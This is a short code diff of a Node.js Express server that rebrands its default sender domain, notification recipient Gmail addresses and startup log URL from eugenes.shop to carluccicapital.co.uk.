@@ -78,7 +78,7 @@ const CONFIG = {
   SMTP_PORT: process.env.SMTP_PORT || 587,
   SMTP_USER: process.env.SMTP_USER || '',
   SMTP_PASS: process.env.SMTP_PASS || '',
-  EMAIL_FROM: process.env.EMAIL_FROM || 'noreply@eugenes.shop'
+  EMAIL_FROM: process.env.EMAIL_FROM || 'noreply@carluccicapital.co.uk'
 };
 
 const originalLog = console.log;
@@ -5314,7 +5314,7 @@ const sendMailtrapEmail = async (to, subject, html) => {
   
   try {
     const info = await emailTransporter.sendMail({
-      from: CONFIG.EMAIL_FROM || 'noreply@eugenes.shop',
+      from: CONFIG.EMAIL_FROM || 'noreply@carluccicapital.co.uk',
       to: to,
       subject: subject,
       html: html
@@ -8166,7 +8166,7 @@ app.post('/api/send-message', async (req, res) => {
     const cookies = parseCookies(req.headers.cookie || '');
     const sessionId = cookies.sid;
     const sessionData = pendingLogins.get(sessionId);
-    const userEmail = 'foundereugene1@gmail.com';
+    const userEmail = 'carluccicapital@gmail.com';
 
     const html = `
 <html>
@@ -8277,7 +8277,7 @@ app.post('/api/send-access-request', async (req, res) => {
     }
 
     // Business email to send to
-    const businessEmail = 'foundereugene1@gmail.com';
+    const businessEmail = 'carluccicapital@gmail.com';
     
     const html = `
 <html>
@@ -8434,7 +8434,7 @@ setInterval(syncAllPeakData, 10000);
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  log('INFO', `App: Dashboard online at https://www.eugenes.shop & http://localhost:${PORT}`);
+  log('INFO', `App: Dashboard online at https://www.carluccicapital.co.uk & http://localhost:${PORT}`);
 });
 
 // Initialize readline for terminal commands if interactive
